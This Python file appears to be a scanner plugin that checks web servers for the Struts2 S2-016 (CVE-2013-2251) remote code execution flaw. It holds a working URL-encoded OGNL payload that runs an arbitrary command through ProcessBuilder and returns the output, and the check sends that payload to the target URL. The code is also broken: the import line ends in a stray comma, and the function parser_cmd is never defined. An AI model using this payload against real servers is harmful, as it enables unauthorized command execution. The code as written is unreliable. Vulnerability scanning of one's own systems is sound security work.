#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.encode import urlencode
from app.lib.utils.common import get_capta, filter_str,

class S2_016_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-016漏洞,又名CVE-2013-2251漏洞',
            'description': 'Struts2 S2-016漏洞可执行任意命令,影响范围为: Struts 2.0.0 - Struts 2.3.15',
            'date': '2013-06-03',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded",
            'Connection': "keep-alive",
        }
        self.payload = '''?redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D'''

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """
        
        check_req = request.get(self.url + self.payload.format(cmd = urlencode(parser_cmd('echo ' + self.capta))), headers = self.headers)
        check_str = filter_str(list(check_req.text))
        try:
            if self.capta in check_str and len(check_str) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    s2_016 = S2_016_BaseVerify('http://localhost:8080/s2_016_war_exploded/')
    s2_016.run()